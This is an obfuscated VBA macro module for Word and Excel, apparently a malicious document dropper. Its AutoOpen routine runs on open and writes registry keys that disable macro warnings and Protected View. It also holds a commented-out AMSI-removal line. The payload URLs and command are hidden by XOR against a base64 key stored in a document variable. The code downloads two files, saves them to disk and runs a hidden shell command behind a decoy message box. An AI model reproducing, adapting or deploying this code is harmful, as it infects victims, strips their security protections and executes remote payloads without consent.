Private jLvcHwwitI       As Boolean
Private AbNwZgzTWd(0 To (23 + 40)) As Byte
Private OIkgPEfYVnOj(0 To (81 Xor 46)) As Byte

Sub AutoOpen()
Set wso = CreateObject("WScript.Shell")
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
'wso.RegDelete "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}", 1, "REG_DWORD"
mVkDBtIDMXban
End Sub

Sub mVkDBtIDMXban()
Dim SonnHqebtGGCbn As String
Dim zXBbObESHxl As Object
Dim aWssKNEuUsDDH As Object
SonnHqebtGGCbn = cRPKmFtIuVtk(Array(27, 130, (131 Xor 18), 220, (14 + (2 Xor 95)), ((29 Xor 117) + 1), ((95 Xor 245) + 57), (88 + 85), 36, ((16 Xor 0) + 19), ((55 Xor 125) + (10 Xor 26)), (14 + 101)), (0 + (0 Xor 0))) & cRPKmFtIuVtk(Array(102, 61, (1 Xor 0), (63 + 35), (19 + (115 Xor 183)), (30 + (3 Xor 32)), 35, ((3 Xor 0) + 38), (2 Xor 14), ((28 Xor 176) + (38 Xor 103)), 243, (32 Xor 105), ((61 Xor 127) + (4 Xor 9)), 220, ((146 Xor 72) + 27), ((6 Xor 32) + (93 Xor 0)), (44 + 3), ((9 Xor 63) + (5 Xor 48))), (2 + 10))
FileUrl2 = cRPKmFtIuVtk(Array((226 + (5 Xor 0)), (0 Xor 5), (192 Xor 49), 126, (44 + (37 Xor 113))), 30) & cRPKmFtIuVtk(Array((172 Xor 73), (63 Xor 163), (176 Xor 68), ((19 Xor 4) + 95), 138, (3 Xor 0), 156, (25 + 53), 212, ((1 Xor 137) + 85), 227, ((9 Xor 56) + (30 Xor 56)), ((4 Xor 0) + (36 Xor 189)), ((5 Xor 12) + 59), (131 Xor 52), ((17 Xor 57) + (27 Xor 36)), (93 + (126 Xor 230)), (15 Xor 152), (25 Xor 189), ((0 Xor 0) + 5), ((0 Xor 128) + (113 Xor 12)), 5, 243, (5 + 3), (49 + (22 Xor 49)), (18 + 214), 168, ((21 Xor 55) + 15), (61 + 108), ((38 Xor 30) + 80), _
((8 Xor 31) + (3 Xor 43)), ((3 Xor 52) + (14 Xor 1)), 252, (2 + 4), ((157 Xor 62) + (1 Xor 13)), ((22 Xor 90) + 54), (42 Xor 124)), 35)
Set zXBbObESHxl = CreateObject(cRPKmFtIuVtk(Array((31 Xor 32)), (29 Xor 85)) & cRPKmFtIuVtk(Array(((57 Xor 122) + (50 Xor 5)), 244, (28 + (114 Xor 235)), ((2 Xor 8) + 148), 247, 192, (122 Xor 234), (52 Xor 137), 239, 205, ((14 Xor 54) + (104 Xor 213)), (49 Xor 181), 158, (73 Xor 46), 8, (66 Xor 223)), 73))
zXBbObESHxl.Open cRPKmFtIuVtk(Array((37 + (5 Xor 32)), 128, (156 + (1 Xor 16))), ((39 Xor 27) + (6 Xor 27))), SonnHqebtGGCbn, False
zXBbObESHxl.send
If zXBbObESHxl.Status = 200 Then
Set aWssKNEuUsDDH = CreateObject(cRPKmFtIuVtk(Array((116 Xor 184), (108 + 66)), ((47 Xor 30) + 43)) & cRPKmFtIuVtk(Array(((41 Xor 101) + 4), ((85 Xor 133) + (21 Xor 3)), ((139 Xor 18) + (4 Xor 36)), (188 + (8 Xor 35)), 27, (0 + 2), 1, ((54 Xor 12) + 108), (69 + 93), ((6 Xor 1) + (74 Xor 192))), ((26 Xor 1) + (26 Xor 89))))
aWssKNEuUsDDH.Open
aWssKNEuUsDDH.Type = 1
aWssKNEuUsDDH.Write zXBbObESHxl.responseBody
aWssKNEuUsDDH.SaveToFile cRPKmFtIuVtk(Array((122 + 132), 205, (54 + 48), 31, 235, 93, ((5 Xor 12) + 155), 177, (58 Xor 78), (23 + 124), (0 + (0 Xor 0)), (61 + 82), 232, (55 Xor 87)), (34 + (16 Xor 86))) & cRPKmFtIuVtk(Array(((57 Xor 90) + (25 Xor 91)), (28 + 212), (9 + (52 Xor 191)), ((15 Xor 19) + (46 Xor 93)), 238, (35 Xor 72), (14 + 19), ((100 Xor 23) + 134), 87, (136 + 66), 145, 197, 106, ((30 Xor 56) + 20)), 118), 2
aWssKNEuUsDDH.Close
Set zXBbObESHxl = CreateObject(cRPKmFtIuVtk(Array(((3 Xor 15) + 167), (211 Xor 35), ((17 Xor 38) + (24 Xor 7)), (7 Xor 254), ((40 Xor 64) + (22 Xor 61)), ((7 Xor 11) + (139 Xor 60)), 49, 202, (117 + (21 Xor 12)), (22 + (46 Xor 126)), 103, 201, 59, 206), (102 + (5 Xor 27))) & cRPKmFtIuVtk(Array(59, (52 Xor 153), ((15 Xor 0) + (164 Xor 109))), 146))
zXBbObESHxl.Open cRPKmFtIuVtk(Array(233, (4 Xor 62), (43 Xor 125)), 149), FileUrl2, False
zXBbObESHxl.send
If zXBbObESHxl.Status = ((22 Xor 14) + 176) Then
Set dNBUvNrVAlQtrC = CreateObject(cRPKmFtIuVtk(Array(8, (45 Xor 176), 17, ((11 Xor 24) + 94), (62 Xor 166), (33 + (4 Xor 1))), (58 Xor 162)) & cRPKmFtIuVtk(Array(((18 Xor 14) + (14 Xor 27)), (67 + 151), 245, 178, (54 Xor 98), (8 Xor 125)), (121 + 37)))
dNBUvNrVAlQtrC.Open
dNBUvNrVAlQtrC.Type = (0 + 1)
dNBUvNrVAlQtrC.Write zXBbObESHxl.responseBody
dNBUvNrVAlQtrC.SaveToFile cRPKmFtIuVtk(Array((55 Xor 78), (32 + 4), ((104 Xor 252) + 40), 224, 247, (128 Xor 86)), 164) & cRPKmFtIuVtk(Array((39 Xor 175), (56 Xor 176), 204, 194, (86 + (26 Xor 58)), ((72 Xor 147) + (3 Xor 28)), ((60 Xor 114) + 167), (35 Xor 233), 27, 248, (7 Xor 183), (35 Xor 89), ((8 Xor 63) + (45 Xor 18)), (82 + (63 Xor 118)), (53 Xor 211), (9 Xor 39), 137, ((21 Xor 8) + (3 Xor 6)), 144, (122 + 3), ((16 Xor 11) + (1 Xor 5)), ((6 Xor 109) + 45), (221 Xor 57), (23 Xor 133), ((6 Xor 28) + (5 Xor 13)), 95, 199, ((19 Xor 63) + 10), _
(129 Xor 75), (131 + (30 Xor 86)), (18 Xor 123), (220 + (7 Xor 25)), (17 + (11 Xor 22)), 78), ((0 Xor 0) + 170)), (0 Xor 2)
dNBUvNrVAlQtrC.Close
strCommand = cRPKmFtIuVtk(Array((116 + 1), (9 Xor 37), ((128 Xor 67) + (1 Xor 8)), (5 + (0 Xor 6)), ((22 Xor 13) + (8 Xor 0)), ((91 Xor 62) + 121), 143, (38 Xor 14), (16 + (31 Xor 209)), 167, (36 + 205), (6 + (11 Xor 109)), (12 Xor 0), 66, ((99 Xor 231) + (10 Xor 72)), (102 + (108 Xor 20)), (135 Xor 62), 220, ((22 Xor 42) + 6), (12 Xor 145), (34 + 175), (39 + 17), (104 + 51), 152, (2 + 5)), (128 Xor 76)) & cRPKmFtIuVtk(Array(126, (97 Xor 221), (79 + 175), 57, 247, (52 Xor 1), (101 + 149), ((2 Xor 8) + 31), (89 + (31 Xor 88)), (73 + 0), (13 + (8 Xor 2)), (117 Xor 177), _
(26 Xor 56), (7 Xor 125), 170, ((69 Xor 247) + 4), 204, 240, (115 + (1 Xor 0)), (1 Xor 11), (2 Xor 131), (186 Xor 108), 181, ((9 Xor 64) + 2), 72, (58 + (33 Xor 76)), 206, 241, 177, (7 Xor 31), (30 + (17 Xor 8)), (1 Xor 131), (63 Xor 136), ((2 Xor 0) + 49)), (161 Xor 68))
Set sHpxraTMIQE = CreateObject(cRPKmFtIuVtk(Array((78 + 66), (117 Xor 254), ((17 Xor 32) + (1 Xor 3)), ((43 Xor 107) + 122), ((22 Xor 8) + (2 Xor 0)), (8 Xor 89), (15 Xor 107), 111, (126 Xor 167), 11, 17, (66 + 184)), ((3 Xor 108) + (15 Xor 151))) & cRPKmFtIuVtk(Array((43 Xor 190)), (99 + (59 Xor 139))))
Set VqslQfyVIs = sHpxraTMIQE.exec(strCommand)
MsgBox cRPKmFtIuVtk(Array(((18 Xor 70) + (15 Xor 78)), (41 Xor 75), (115 + 103), (43 + (12 Xor 18)), 249, (22 + (5 Xor 15)), (18 + 30), 205, (66 + (134 Xor 37)), ((7 Xor 51) + 67), ((18 Xor 59) + 28), (42 Xor 198), (26 + 159)), 276) & cRPKmFtIuVtk(Array(16, (2 + 2), (2 Xor 1), (9 Xor 108), 182, (84 + (140 Xor 24)), (1 Xor 24), (42 + (44 Xor 22)), (82 Xor 212), (34 + (0 Xor 2)), (36 Xor 173), ((17 Xor 123) + (45 Xor 24)), (161 + 33), ((89 Xor 57) + 94), ((1 Xor 0) + (5 Xor 40)), (44 + 18), (56 + 4), ((42 Xor 103) + (31 Xor 93)), ((23 Xor 13) + (2 Xor 5)), 126, _
(172 Xor 27)), (147 + (38 Xor 168)))
Else
MsgBox cRPKmFtIuVtk(Array((134 Xor 123), 131, 239, (148 Xor 118), 230, (72 Xor 53), 86, ((12 Xor 80) + 29), ((35 Xor 135) + 43), 39, (198 + 36), (125 Xor 148), (4 + (10 Xor 40)), 228, (42 Xor 182), (47 Xor 29), (137 Xor 27), (112 Xor 187), (24 + (15 Xor 63)), (36 + (7 Xor 51)), 21, (80 + (72 Xor 52)), (56 Xor 0), 59, ((5 Xor 43) + (6 Xor 38)), ((31 Xor 50) + 57), ((42 Xor 101) + (1 Xor 11)), (6 + (1 Xor 0))), 310) & cRPKmFtIuVtk(Array(248, ((1 Xor 2) + (2 Xor 6)), (1 Xor 124), (65 + 184), (67 + (14 Xor 136)), (0 Xor 5), ((36 Xor 114) + (44 Xor 121)), 158, _
((37 Xor 20) + 69), (170 + (40 Xor 109)), (17 + (25 Xor 7)), 141, ((48 Xor 118) + 10), (11 Xor 80), ((85 Xor 231) + (8 Xor 22)), ((1 Xor 12) + 35), ((2 Xor 97) + 139), (15 Xor 29)), (157 Xor 463))
End If
End If
End Sub
Public Function HRLWXRlZZuL(ByVal aeGCfGlogPIWY As String) As Byte()
If Not jLvcHwwitI Then fCLKwdNAQFM
Dim cKPHVibsAL() As Byte: cKPHVibsAL = vvaIdhsLFSr(aeGCfGlogPIWY)
Dim ntwjhSSGUW As Long: ntwjhSSGUW = UBound(cKPHVibsAL) + (1 Xor 0)
If ntwjhSSGUW Mod 4 <> (0 Xor 0) Then Err.Raise vbObjectError, , ""
Do While ntwjhSSGUW > (0 + (0 Xor 0))
If cKPHVibsAL(ntwjhSSGUW - (1 Xor 0)) <> Asc("=") Then Exit Do
ntwjhSSGUW = ntwjhSSGUW - (0 Xor 1)
Loop
Dim gAuIPIaVpgxXO As Long: gAuIPIaVpgxXO = (ntwjhSSGUW * (1 + (0 Xor 2))) \ (4 + (0 Xor 0))
Dim HERnjCCKvXNQgi() As Byte
ReDim HERnjCCKvXNQgi(((0 Xor 0) + (0 Xor 0)) To gAuIPIaVpgxXO - 1) As Byte
Dim VBbSjsDbXqqFC As Long
Dim BXILJtSvriEr As Long
Do While VBbSjsDbXqqFC < ntwjhSSGUW
Dim vprtSRBzLx As Byte: vprtSRBzLx = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (0 Xor 1)
Dim VQtKdExZvGc As Byte: VQtKdExZvGc = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (0 Xor 1)
Dim aJQFpccMRU As Byte: If VBbSjsDbXqqFC < ntwjhSSGUW Then aJQFpccMRU = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + (1 Xor 0) Else aJQFpccMRU = Asc("A")
Dim eEmILQouTtdJ As Byte: If VBbSjsDbXqqFC < ntwjhSSGUW Then eEmILQouTtdJ = cKPHVibsAL(VBbSjsDbXqqFC): VBbSjsDbXqqFC = VBbSjsDbXqqFC + ((0 Xor 1) + (0 Xor 0)) Else eEmILQouTtdJ = Asc("A")
If vprtSRBzLx > (46 + (8 Xor 89)) Or VQtKdExZvGc > 127 Or aJQFpccMRU > 127 Or eEmILQouTtdJ > (118 + (2 Xor 11)) Then _
Err.Raise vbObjectError, , ""
Dim yoDVgXwKlSilNY As Byte: yoDVgXwKlSilNY = OIkgPEfYVnOj(vprtSRBzLx)
Dim RFNyxblWffn As Byte: RFNyxblWffn = OIkgPEfYVnOj(VQtKdExZvGc)
Dim LYtKUqiwvfed As Byte: LYtKUqiwvfed = OIkgPEfYVnOj(aJQFpccMRU)
Dim aEjwPUwfWAO As Byte: aEjwPUwfWAO = OIkgPEfYVnOj(eEmILQouTtdJ)
If yoDVgXwKlSilNY > (8 + (7 Xor 48)) Or RFNyxblWffn > ((9 Xor 18) + (20 Xor 48)) Or LYtKUqiwvfed > (29 + (26 Xor 56)) Or aEjwPUwfWAO > 63 Then _
Err.Raise vbObjectError, , ""
Dim ljuECQaMhejNRL As Byte: ljuECQaMhejNRL = (yoDVgXwKlSilNY * ((2 Xor 0) + (0 Xor 2))) Or (RFNyxblWffn \ &H10)
Dim gonPEdfQLZ As Byte: gonPEdfQLZ = ((RFNyxblWffn And &HF) * &H10) Or (LYtKUqiwvfed \ (1 + 3))
Dim tSBBkREwXj As Byte: tSBBkREwXj = ((LYtKUqiwvfed And (2 + (0 Xor 1))) * &H40) Or aEjwPUwfWAO
HERnjCCKvXNQgi(BXILJtSvriEr) = ljuECQaMhejNRL: BXILJtSvriEr = BXILJtSvriEr + 1
If BXILJtSvriEr < gAuIPIaVpgxXO Then HERnjCCKvXNQgi(BXILJtSvriEr) = gonPEdfQLZ: BXILJtSvriEr = BXILJtSvriEr + ((0 Xor 0) + (0 Xor 1))
If BXILJtSvriEr < gAuIPIaVpgxXO Then HERnjCCKvXNQgi(BXILJtSvriEr) = tSBBkREwXj: BXILJtSvriEr = BXILJtSvriEr + (1 Xor 0)
Loop
HRLWXRlZZuL = HERnjCCKvXNQgi
End Function
Private Sub fCLKwdNAQFM()
Dim mHMyXjcStIU As Integer, zCGfumdOnzzGM As Integer
zCGfumdOnzzGM = (0 Xor 0)
For mHMyXjcStIU = Asc("A") To Asc("Z"): AbNwZgzTWd(zCGfumdOnzzGM) = mHMyXjcStIU: zCGfumdOnzzGM = zCGfumdOnzzGM + 1: Next
For mHMyXjcStIU = Asc("a") To Asc("z"): AbNwZgzTWd(zCGfumdOnzzGM) = mHMyXjcStIU: zCGfumdOnzzGM = zCGfumdOnzzGM + 1: Next
For mHMyXjcStIU = Asc("0") To Asc("9"): AbNwZgzTWd(zCGfumdOnzzGM) = mHMyXjcStIU: zCGfumdOnzzGM = zCGfumdOnzzGM + (1 + 0): Next
AbNwZgzTWd(zCGfumdOnzzGM) = Asc("+"): zCGfumdOnzzGM = zCGfumdOnzzGM + (0 Xor 1)
AbNwZgzTWd(zCGfumdOnzzGM) = Asc("/"): zCGfumdOnzzGM = zCGfumdOnzzGM + ((0 Xor 0) + 1)
For zCGfumdOnzzGM = (0 + 0) To ((3 Xor 9) + (23 Xor 98)): OIkgPEfYVnOj(zCGfumdOnzzGM) = (20 + 235): Next
For zCGfumdOnzzGM = (0 + 0) To 63: OIkgPEfYVnOj(AbNwZgzTWd(zCGfumdOnzzGM)) = zCGfumdOnzzGM: Next
jLvcHwwitI = True
End Sub
Private Function vvaIdhsLFSr(ByVal aeGCfGlogPIWY As String) As Byte()
Dim RFNyxblWffn() As Byte: RFNyxblWffn = aeGCfGlogPIWY
Dim tJInFblbfdApY As Long: tJInFblbfdApY = (UBound(RFNyxblWffn) + (0 Xor 1)) \ (0 + (1 Xor 3))
If tJInFblbfdApY = ((0 Xor 0) + (0 Xor 0)) Then vvaIdhsLFSr = RFNyxblWffn: Exit Function
Dim LYtKUqiwvfed() As Byte
ReDim LYtKUqiwvfed((0 + (0 Xor 0)) To tJInFblbfdApY - (0 + (0 Xor 1))) As Byte
Dim xJLLCVGBVqSkz As Long
For xJLLCVGBVqSkz = 0 To tJInFblbfdApY - 1
Dim mHMyXjcStIU As Long: mHMyXjcStIU = RFNyxblWffn((2 + 0) * xJLLCVGBVqSkz) + 256 * CLng(RFNyxblWffn((0 Xor 2) * xJLLCVGBVqSkz + 1))
If mHMyXjcStIU >= ((93 Xor 135) + (31 Xor 57)) Then mHMyXjcStIU = Asc("?")
LYtKUqiwvfed(xJLLCVGBVqSkz) = mHMyXjcStIU
Next
vvaIdhsLFSr = LYtKUqiwvfed
End Function
Private Function cRPKmFtIuVtk(kbMJGjvRrQJR As Variant, HdGJDFWDwILNSk As Integer)
Dim lsILdndyLtXoZ As String
Dim ipixpjfDMQ() As Byte
ipixpjfDMQ = HRLWXRlZZuL(ActiveDocument.Variables("kBQHAjmEelVSHUyT"))
lsILdndyLtXoZ = ""
For zCGfumdOnzzGM = LBound(kbMJGjvRrQJR) To UBound(kbMJGjvRrQJR)
lsILdndyLtXoZ = lsILdndyLtXoZ & Chr(ipixpjfDMQ(zCGfumdOnzzGM + HdGJDFWDwILNSk) Xor kbMJGjvRrQJR(zCGfumdOnzzGM))
Next
cRPKmFtIuVtk = lsILdndyLtXoZ
End Function

Sub dropper()
ActiveDocument.Variables.Add Name:="kBQHAjmEelVSHUyT", _
 Value:="c/blrFFGzJwUDWpdVBM1WO9xExkjgIB9euvb5lcOj3GFDrrKs8VGpDOyfPrp2W+tdIdIxKWVMM81wTkH2Z9unLFgc84o3/FnchOXx/GEr/bJwZW4yNYzXM0NxfmN6h+i+8lIdnPDw/y99zpDvDTK1Rvkc9O0NMCd5NOyBlLNYv2/oBJf/pk1i/ywXqz6SD+Ed4Zv+YiufwJJ2V412ghirofXNRg6HuC8oL/m7KO1Baapnn6VwCYqqtQfvBCgTy7H1aV9av5p//lHil1/JUO7blGt502yy9FBSiuqu5n+YN7rZMfPbhDYkU6EaaZ9xSRnmH5LmIf5wkQ4sImEfBeS966EKhnyxALH2FDISSEQQYpjdJb50BCoJosACu2xHyyfmXRrYBDbjXcQpk36v6HRXExJ/1Ub07jxnY2UXWxZm0+DmgaA81Hnpi02YexVWjdGN2iMJx6Wp3HK9xjPTuE8e7RRmnM="
End Sub
